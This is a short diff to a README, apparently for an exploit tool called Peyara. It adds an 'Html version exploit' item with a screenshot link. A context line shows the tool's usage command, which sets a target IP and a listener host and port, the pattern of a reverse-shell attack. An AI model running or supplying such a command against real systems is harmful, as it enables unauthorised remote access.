@@ -25,6 +25,10 @@ python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444
 
 <img src="https://raw.githubusercontent.com/capture0x/Peyara/refs/heads/main/peyara1.png" width="100%"></img>
 
+ 4. Html version exploit
+
+<img src="https://raw.githubusercontent.com/capture0x/Peyara/refs/heads/main/peyara.png" width="100%"></img>
+
  
 
 
